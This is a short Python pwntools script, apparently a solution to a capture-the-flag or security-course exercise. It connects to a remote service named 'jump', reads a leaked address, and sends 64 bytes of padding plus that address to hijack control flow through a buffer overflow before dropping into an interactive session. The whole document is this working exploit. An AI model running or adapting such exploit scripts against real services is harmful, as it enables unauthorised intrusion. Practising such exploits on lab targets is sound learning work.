from pwn import *
import re

# p = process("./jump")
p = remote("plsdonthaq.me", 2001)

data = p.recv()
print(data)

addr = p32(int(re.findall(b"0x(.+?)\n", data)[0],16))
print("Address:", addr)

p.sendline(b"D" * 0x40 + addr)

print(p.recvline())
p.interactive()